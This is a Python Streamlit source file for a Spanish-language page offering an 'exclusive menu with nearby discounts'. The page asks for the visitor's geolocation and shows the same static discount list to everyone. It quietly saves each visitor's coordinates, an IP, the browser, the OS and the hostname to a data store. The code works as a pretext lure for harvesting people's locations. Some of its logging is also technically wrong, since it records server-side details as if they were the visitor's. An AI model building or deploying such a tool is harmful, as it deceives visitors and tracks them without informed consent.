import streamlit as st
import streamlit.components.v1 as components
import json
import requests
import platform
import socket
from datetime import datetime
from utils import guardar_datos, obtener_visitas

st.set_page_config(page_title="Carta con Descuentos", layout="centered")

st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")

# Script para obtener geolocalización y actualizar URL con query param sin recargar
geoloc_script = """
<script>
navigator.geolocation.getCurrentPosition(
  (position) => {
    const coords = {
      lat: position.coords.latitude,
      lon: position.coords.longitude
    };
    const jsonString = JSON.stringify(coords);
    // Actualiza URL sin recargar
    const url = new URL(window.location);
    url.searchParams.set('geodata', jsonString);
    window.history.replaceState(null, null, url.toString());
  },
  (error) => {
    const errorMsg = JSON.stringify({error: "No se pudo obtener ubicación"});
    const url = new URL(window.location);
    url.searchParams.set('geodata', errorMsg);
    window.history.replaceState(null, null, url.toString());
  }
);
</script>
"""

components.html(geoloc_script, height=0)

# Leer parámetros de consulta con la función experimental correcta
query_params = st.experimental_get_query_params()

lat, lon = None, None
if "geodata" in query_params:
    try:
        geo_data = json.loads(query_params["geodata"][0])
        lat, lon = geo_data.get("lat"), geo_data.get("lon")
    except Exception:
        lat, lon = None, None

if lat and lon:
    st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
    st.subheader("Descuentos cercanos para ti:")
    st.markdown("""
    - 🍕 Pizza Margarita -20%
    - 🍣 Sushi Deluxe -15%
    - 🥗 Ensalada Mediterránea -10%
    """)

    # Registrar datos
    user_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "lat": lat,
        "lon": lon,
        "ip": requests.get("https://api.ipify.org").text,
        "browser": st.runtime.scriptrunner.get_script_run_context().user_agent,
        "os": platform.system(),
        "hostname": socket.gethostname()
    }

    guardar_datos(user_data)
else:
    st.warning("Esperando acceso a tu ubicación...")
